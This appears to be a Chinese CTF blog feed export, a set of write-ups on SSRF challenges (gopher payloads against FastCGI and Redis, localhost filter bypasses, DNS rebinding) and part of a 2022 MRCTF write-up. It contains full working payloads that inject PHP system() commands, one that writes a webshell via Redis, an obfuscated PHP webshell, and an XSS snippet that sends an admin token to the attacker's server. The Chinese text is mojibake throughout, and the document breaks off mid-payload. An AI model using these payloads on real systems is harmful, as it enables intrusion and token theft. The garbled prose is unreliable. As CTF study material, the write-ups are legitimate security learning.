href="#FastCGIåè®®-1" class="headerlink" title="FastCGIåè®®"></a>FastCGIåè®®</h3><p><strong>æ–¹æ³•ä¸€</strong>ï¼š</p><p>ç›´æ¥ä¸Šgopherus</p><p>å…¶ä¸­/usr/local/lib/php/PEAR.php ä¸ºå®‰è£…phpæ—¶é»˜è®¤è‡ªå¸¦çš„phpæ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429170013890.png" alt="image-20220429170013890"></p><p>å…ˆls /ï¼Œå†catï¼Œåœ¨urlä¸­è¦å…ˆæŠŠè¿™ä¸ªpayloadçš„å€¼å†urlç¼–ç ä¸€æ¬¡ï¼Œæ‰èƒ½æ‹¿åˆ°flag</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-5da7279b1e83a566.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2508%2500%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%251BSCRIPT_FILENAME%2Fusr%2Flocal%2Flib%2Fphp%2FPEAR.php%250D%2501DOCUMENT_ROOT%2F%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_52cc1357979c158b0cb02c8ff00b83b1%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429170110205.png" alt="image-20220429170110205"></p><p><strong>æ–¹æ³•äºŒï¼š</strong></p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p>pç‰›çš„è„šæœ¬fpm.py </p><p>å¼€ä¸¤ä¸ªç»ˆç«¯ï¼Œä¸€ä¸ªç›‘å¬è‡ªå·±çš„9000ç«¯å£</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220035078.png" alt="image-20220429220035078"></p><p>å¦ä¸€ä¸ªæ‰§è¡Œè„šæœ¬</p><pre class="language-none"><code class="language-none">å‘½ä»¤ï¼špython [è„šæœ¬å] -c [è¦æ‰§è¡Œçš„ä»£ç ] -p [ç«¯å£å·] [ip] [è¦æ‰§è¡Œçš„phpæ–‡ä»¶]</code></pre><pre class="language-none"><code class="language-none">python3 fpm.py 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -c &quot;&lt;?php system(&#39;ls&#39;);?&gt;&quot;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220107107.png" alt="image-20220429220107107"></p><p>å¾—åˆ°exp.txt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220158472.png" alt="image-20220429220158472"></p><p>è¿›è¡Œurlç¼–ç </p><pre class="language-none"><code class="language-none">#python2from urllib import quotef &#x3D; open(&#39;D:\Desktop\exp.txt&#39;)ff &#x3D; f.read()print(&#39;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_&#39;+quote(ff))#gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%E8u%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E8u%01%DB%00%00%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0B%17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0C%00QUERY_STRING%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%10CONTENT_TYPEapplication&#x2F;text%0E%02CONTENT_LENGTH21%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%01%04%E8u%00%00%00%00%01%05%E8u%00%15%00%00%3C%3Fphp%20system%28%27ls%27%29%3B%3F%3E%01%05%E8u%00%00%00%00</code></pre><p>å†å¯¹å¾—åˆ°çš„ç»“æœè¿›è¡Œå†æ¬¡ç¼–ç </p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-1c4d6ae123d715b8.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%25E8u%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%25E8u%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI%2F1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250B%2517SCRIPT_NAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%250F%250ESERVER_SOFTWAREphp%2Ffcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250C%2510CONTENT_TYPEapplication%2Ftext%250E%2502CONTENT_LENGTH21%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%25E8u%2500%2500%2500%2500%2501%2505%25E8u%2500%2515%2500%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253B%253F%253E%2501%2505%25E8u%2500%2500%2500%2500</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220326896.png" alt="image-20220429220326896"></p><p>æˆåŠŸè¯»åˆ°äº†æ–‡ä»¶ï¼Œåè¾¹å°±æ˜¯ls /ç„¶åcat /flagçš„æ“ä½œäº†</p><p>çœ‹åˆ°æœ‰wpç”¨çš„å†™ä¸€å¥è¯æœ¨é©¬çš„æ–¹å¼ï¼Œç„¶åèšå‰‘è¿æ¥ï¼Œä½†æ˜¯æˆ‘æ²¡å¤ç°æˆåŠŸ</p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121643002?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1">https://blog.csdn.net/unexpectedthing/article/details/121643002?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1</a></p><h3 id="redisåè®®"><a href="#redisåè®®" class="headerlink" title="redisåè®®"></a>redisåè®®</h3><p>ç›´æ¥ä¸Šgopherus</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222019370.png" alt="image-20220429222019370"></p><p>è¿™é‡Œå¦‚æœphp payloadæŒ‰é»˜è®¤çš„æ¥çš„è¯åº”è¯¥æ˜¯ä¸€ä¸ªä»¥cmdä¸ºå¯†ç çš„ä¸€å¥è¯æœ¨é©¬</p><pre class="language-none"><code class="language-none">url&#x3D;gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_%252A%2527%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</code></pre><p>åŒæ ·æ˜¯å†ç¼–ç ä¸€æ¬¡ç„¶åä¸Šä¼ ï¼Œä¹‹åè®¿é—®shell.phpå°±èƒ½çœ‹è§ç»“æœäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222057019.png" alt="image-20220429222057019"></p><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222350965.png" alt="image-20220429222350965"></p><p>è¦æ±‚å¿…é¡»æœ‰<a href="http://notfound.ctfhub.com/">http://notfound.ctfhub.com</a></p><p>å¯ä»¥åˆ©ç”¨@æ¥ç»•è¿‡</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-eb34acd716115c01.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222336425.png" alt="image-20220429222336425"></p><h3 id="æ•°å­—IP-Bypass"><a href="#æ•°å­—IP-Bypass" class="headerlink" title="æ•°å­—IP Bypass"></a>æ•°å­—IP Bypass</h3><p>banæ‰äº†127ä»¥åŠ172.ä¸èƒ½ä½¿ç”¨ç‚¹åˆ†åè¿›åˆ¶çš„IPäº†ã€‚ä½†æ˜¯åˆè¦è®¿é—®127.0.0.1</p><p>0.0.0.0</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222507844.png" alt="image-20220429222507844"></p><p>localhost</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222628519.png" alt="image-20220429222628519"></p><p>è¿˜æœ‰æœ¬åœ°å›ç¯çš„å…¶ä»–è¡¨ç¤ºæ–¹æ³•</p><p>http://[::ffff:7f00:1]</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222734210.png" alt="image-20220429222734210"></p><p><a href="http://0.0.0.0/">http://0:80</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222833867.png" alt="image-20220429222833867"></p><p>ipåå…­è¿›åˆ¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224122368.png" alt="image-20220429224122368"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224716467.png" alt="image-20220429224716467"></p><p>ipå…«è¿›åˆ¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224213146.png" alt="image-20220429224213146"></p><p>é¡ºå¸¦ä¸€æè¿™ä¸ªæ­£åˆ™åŒ¹é…çš„è¿‡æ»¤ï¼Œå¥½åƒè¿˜è¿‡æ»¤äº†http://å’Œ/flag.phpä¹‹é—´çš„ç‚¹ï¼Œä½†æ˜¯ä½ åªè¦å»äº†å‰è¾¹çš„http://å°±èƒ½ç»•è¿‡äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224407850.png" alt="image-20220429224407850"></p><p>ipåè¿›åˆ¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224636453.png" alt="image-20220429224636453"></p><h3 id="302è·³è½¬-Bypass"><a href="#302è·³è½¬-Bypass" class="headerlink" title="302è·³è½¬ Bypass"></a>302è·³è½¬ Bypass</h3><p>æ„Ÿè§‰é¢˜ç›®ç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œåˆ©ç”¨çŸ­é“¾æ¥å¹¶ä¸èƒ½å®ç°è·³è½¬ï¼Œåªèƒ½fileåè®®è¯»ä¸€ä¸‹æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429230757875.png" alt="image-20220429230757875"></p><p>ç„¶ålocalhostæˆ–è€…0.0.0.0å°±è¿‡äº†</p><hr><p>å¯¹ä¸èµ·ï¼Œæˆ‘é“æ­‰ï¼Œä¸æ˜¯ç¯å¢ƒçš„é—®é¢˜ï¼Œæ˜¯å›½å†…çš„é‚£äº›çŸ­é“¾æ¥ç”Ÿæˆç½‘ç«™çš„é—®é¢˜ã€‚ã€‚ã€‚</p><p>ç”¨è¿™ä¸ª<a href="https://tinyurl.com/app/">https://tinyurl.com/app/</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429232119669.png" alt="image-20220429232119669"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429232131305.png" alt="image-20220429232131305"></p><h3 id="DNSé‡ç»‘å®š-Bypass"><a href="#DNSé‡ç»‘å®š-Bypass" class="headerlink" title="DNSé‡ç»‘å®š Bypass"></a>DNSé‡ç»‘å®š Bypass</h3><p><a href="https://zhuanlan.zhihu.com/p/89426041">æµ…è°ˆDNSé‡ç»‘å®šæ¼æ´ - çŸ¥ä¹ (zhihu.com)</a></p><p><strong>DNS Rebinding</strong></p><p>åœ¨ç½‘é¡µæµè§ˆè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·åœ¨åœ°å€æ ä¸­è¾“å…¥åŒ…å«åŸŸåçš„ç½‘å€ã€‚æµè§ˆå™¨é€šè¿‡DNSæœåŠ¡å™¨å°†åŸŸåè§£æä¸ºIPåœ°å€ï¼Œç„¶åå‘å¯¹åº”çš„IPåœ°å€è¯·æ±‚èµ„æºï¼Œæœ€åå±•ç°ç»™ç”¨æˆ·ã€‚è€Œå¯¹äºåŸŸåæ‰€æœ‰è€…ï¼Œä»–å¯ä»¥è®¾ç½®åŸŸåæ‰€å¯¹åº”çš„IPåœ°å€ã€‚å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œè§£æåŸŸåè·å–ä¸€ä¸ªIPåœ°å€ï¼›ç„¶åï¼ŒåŸŸåæŒæœ‰è€…ä¿®æ”¹å¯¹åº”çš„IPåœ°å€ï¼›ç”¨æˆ·å†æ¬¡è¯·æ±‚è¯¥åŸŸåï¼Œå°±ä¼šè·å–ä¸€ä¸ªæ–°çš„IPåœ°å€ã€‚å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ•´ä¸ªè¿‡ç¨‹è®¿é—®çš„éƒ½æ˜¯åŒä¸€åŸŸåï¼Œæ‰€ä»¥è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚è¿™å°±é€ æˆäº†DNS Rebindingæ”»å‡»ã€‚</p><p><strong>å…·ä½“æ­¥éª¤</strong></p><ol><li>æ”»å‡»è€…æ§åˆ¶æ¶æ„çš„DNSæœåŠ¡å™¨æ¥å›å¤åŸŸçš„æŸ¥è¯¢,å¦‚rebind.network</li><li>æ”»å‡»è€…é€šè¿‡ä¸€äº›æ–¹å¼è¯±å¯¼å—å®³è€…åŠ è½½<a href="https://link.zhihu.com/?target=http://rebind.network">http://rebind.network</a></li><li>ç”¨æˆ·æ‰“å¼€é“¾æ¥,æµè§ˆå™¨å°±ä¼šå‘å‡ºDNSè¯·æ±‚æŸ¥æ‰¾rebind.networkçš„IPåœ°å€</li><li>æ¶æ„DNSæœåŠ¡å™¨æ”¶åˆ°å—å®³è€…çš„è¯·æ±‚,å¹¶ä½¿ç”¨çœŸå®IPåœ°å€è¿›è¡Œå“åº”,å¹¶å°†TTLå€¼è®¾ç½®ä¸º1ç§’,è®©å—å®³è€…çš„æœºå™¨ç¼“å­˜å¾ˆå¿«å¤±æ•ˆ</li><li>ä»<a href="https://link.zhihu.com/?target=http://rebind.network">http://rebind.network</a>åŠ è½½çš„ç½‘é¡µåŒ…å«æ¶æ„çš„jsä»£ç ,æ„é€ æ¶æ„çš„è¯·æ±‚åˆ°<a href="https://link.zhihu.com/?target=http://rebind.network/index">http://rebind.network/index</a>,è€Œå—å®³è€…çš„æµè§ˆå™¨ä¾¿åœ¨æ‰§è¡Œæ¶æ„è¯·æ±‚</li><li>ä¸€å¼€å§‹çš„æ¶æ„è¯·æ±‚å½“ç„¶æ˜¯å‘åˆ°äº†æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Š,ä½†æ˜¯éšç€TTLæ—¶é—´ç»“æŸ,æ”»å‡»è€…å°±å¯ä»¥è®©<a href="https://link.zhihu.com/?target=http://rebind.network">http://rebind.network</a>ç»‘å®šåˆ°åˆ«çš„IP,å¦‚æœèƒ½æ•è·å—å®³è€…çš„ä¸€äº›æ”¾åœ¨å†…ç½‘çš„åº”ç”¨IPåœ°å€,å°±å¯ä»¥é’ˆå¯¹è¿™ä¸ªå†…ç½‘åº”ç”¨æ„é€ å‡ºå¯¹åº”çš„æ¶æ„è¯·æ±‚,ç„¶åæµè§ˆå™¨æ‰§è¡Œçš„æ¶æ„è¯·æ±‚å°±å‘é€åˆ°äº†å†…ç½‘åº”ç”¨,è¾¾åˆ°äº†æ”»å‡»çš„æ•ˆæœ</li></ol><p><strong>åŒæºç­–ç•¥çš„å¤±æ•ˆ</strong></p><p>å¯¹äºWEBçš„åŒæºç­–ç•¥ç›¸ä¿¡å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰,<strong>å¦‚æœä¸¤ä¸ªé¡µé¢çš„åè®®ï¼Œç«¯å£ï¼ˆå¦‚æœæœ‰æŒ‡å®šï¼‰å’ŒåŸŸåéƒ½ç›¸åŒï¼Œåˆ™ä¸¤ä¸ªé¡µé¢å…·æœ‰ç›¸åŒçš„æº</strong>,è€Œä¸åŒæºçš„å®¢æˆ·ç«¯è„šæœ¬åœ¨æ²¡æœ‰æ˜ç¡®æˆæƒçš„æƒ…å†µä¸‹ï¼Œä¸èƒ½è¯»å†™å¯¹æ–¹èµ„æºã€‚</p><p>å½“ç„¶,é¡µé¢ä¸­çš„é“¾æ¥ï¼Œé‡å®šå‘ä»¥åŠè¡¨å•æäº¤æ˜¯ä¸ä¼šå—åˆ°åŒæºç­–ç•¥é™åˆ¶çš„,å¹¶ä¸”,è·¨åŸŸèµ„æºçš„å¼•å…¥æ˜¯å¯ä»¥çš„ã€‚ä½†æ˜¯jsä¸èƒ½è¯»å†™åŠ è½½çš„å†…å®¹ã€‚</p><p>åŒæºç­–ç•¥ç¡®å®æé«˜äº†webçš„å®‰å…¨æ€§,ä½†æ˜¯å¯¹äºDNS Rebindingæ¥è¯´æ˜¯æ²¡æœ‰ä½œç”¨çš„,å› ä¸ºåŒæºç­–ç•¥çœ‹çš„æ˜¯åŸŸå,å¹¶ä¸æ˜¯èƒŒåçš„IPåœ°å€,è™½ç„¶ä¸¤æ¬¡çš„è¯·æ±‚IPåœ°å€ä¸åŒ,ä½†æ˜¯ç”±äºDNSæœåŠ¡å™¨çš„ç»‘å®š,åŸŸåéƒ½æ˜¯ä¸€æ ·çš„,é‚£ä¹ˆè‡ªç„¶ä¸è¿ååŒæºç­–ç•¥.</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</a></p><p>åœ¨è¿™ä¸ªç½‘ç«™è®¾ç½®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429231547758.png" alt="image-20220429231547758"></p><p>ç„¶åè®¿é—®å°±è¡Œäº†ï¼Œå¦‚æœæ²¡æœ‰çš„è¯å¤šåˆ·æ–°å‡ æ¬¡ï¼Œå› ä¸ºç”Ÿæˆçš„ä¸»æœºåå°†éšæœºè§£æä¸ºä½¿ç”¨éå¸¸ä½çš„ ttl æŒ‡å®šçš„åœ°å€ä¹‹ä¸€ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429231604839.png" alt="image-20220429231604839"></p>]]></content>
      
      
      
        <tags>
            
            <tag> webå­¦ä¹  </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022MRCTFå¤ç°</title>
      <link href="/2022/04/25/2022MRCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/25/2022MRCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘å¤ªèœäº†ï¼Œåªèƒ½é çœ‹åˆ«äººçš„wpæ¥å¤ç°è¿‡æ—¥å­äº†</p><h3 id="WebCheckIn"><a href="#WebCheckIn" class="headerlink" title="WebCheckIn"></a>WebCheckIn</h3><p>å¥½éªšçš„æ€è·¯ï¼Œä»æ¥æ²¡æœ‰æƒ³è¿‡èƒ½è¿™æ ·</p><p>ä¸€ä¸ªåªèƒ½ä¼ phpæ–‡ä»¶çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯æ£€æµ‹åˆ°ä¸€äº›å‘½ä»¤æ‰§è¡Œæˆ–è€…å…¶ä»–çš„å†…å®¹å°±ä¼šæŠ¥é”™ã€‚</p><p><strong>æ–¹æ³•ä¸€</strong></p><p> r4kapigçš„wpé‡Œçš„æ–¹å¼ï¼Œåˆ©ç”¨new ERROR(1);æ¥æŠ›å‡ºé”™è¯¯</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215113191.png" alt="image-20220425215113191"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215120212.png" alt="image-20220425215120212"></p><p>ä½†æ˜¯äº‹å®ä¸Šè¿™åº”è¯¥æ˜¯è¿™é“é¢˜çš„åç«¯ç”¨æ¥è¿‡æ»¤ä¸Šä¼ çš„phpæ–‡ä»¶é‡Œçš„å†…å®¹çš„ä»£ç å¯¼è‡´çš„ï¼Œè¿™ä¸ªæ£€æµ‹æ„Ÿè§‰æœ‰ç‚¹ç¥å¥‡ã€‚åˆ©ç”¨newä¸€ä¸ªç±»ä¹‹ååè¾¹ä¸ç®¡æ˜¯ä»€ä¹ˆéƒ½èƒ½ä¼ ä¸Šå»ï¼Œåªä¸è¿‡åªæœ‰newä¸€ä¸ªphpçš„åŸºç±»æ—¶ä¸Šä¼ çš„phpæ–‡ä»¶æ‰ä¸ä¼šå› ä¸ºæŠ¥é”™è€Œå¯¼è‡´åœæ­¢æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œéšä¾¿newä¸€ä¸ªåŸºç±»å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215459825.png" alt="image-20220425215459825"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215526239.png" alt="image-20220425215526239"></p><p>ç„¶åæ‰§è¡Œgrepå‘½ä»¤æ‰¾flagå°±è¡Œ</p><p><strong>æ–¹æ³•äºŒ</strong></p><p>è¿™æ˜¯wmçš„wpé‡Œçš„æ–¹æ³•</p><p>ä¸€ä¸ªé æ„é€ CHRä»¥åŠåŠ¨æ€æ‹¼æ¥ç‰¹æ€§æ„é€ å‡ºçš„ä¸€ä¸ªå¾ˆç¦»è°±çš„webshell</p><pre class="language-none"><code class="language-none">&lt;?php(((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^((.999999999999999).(.999999999999999))).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(9)))))($_POST[1])?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425220952133.png" alt="image-20220425220952133"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425221006937.png" alt="image-20220425221006937"></p><h3 id="God-of-GPA"><a href="#God-of-GPA" class="headerlink" title="God_of_GPA"></a>God_of_GPA</h3><p>å…ˆæ³¨å†Œä¸ªè´¦å·ï¼Œç„¶åç™»å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230157304.png" alt="image-20220425230157304"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰tokenï¼Œè¿™åº”è¯¥æ˜¯è´Ÿè´£è®¤è¯ç”¨æˆ·èº«ä»½çš„ã€‚</p><p>ç™»å½•ä¹‹ååœ¨æŸ¥çœ‹æˆç»©é‡Œæœ‰ä¸ªåªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹çš„æŒ‰é’®ï¼Œè€Œä¸”æˆ‘ä»¬è¿˜å¯ä»¥å‘åƒåœ¾è¯ï¼Œç„¶åå°†idæäº¤ç»™ç®¡ç†å‘˜è®©ä»–çœ‹ã€‚è¿™é“é¢˜å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨xssæ¥è·å–ç®¡ç†å‘˜çš„tokenæ¥å¾—åˆ°flag</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>scrip<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>console.log("injected");let uri = window.location.href + "";if (uri.indexOf('token') > -1)&#123;    location.href="//æœåŠ¡å™¨ip/flag?f="+encodeURIComponent(uri)&#125;else&#123; 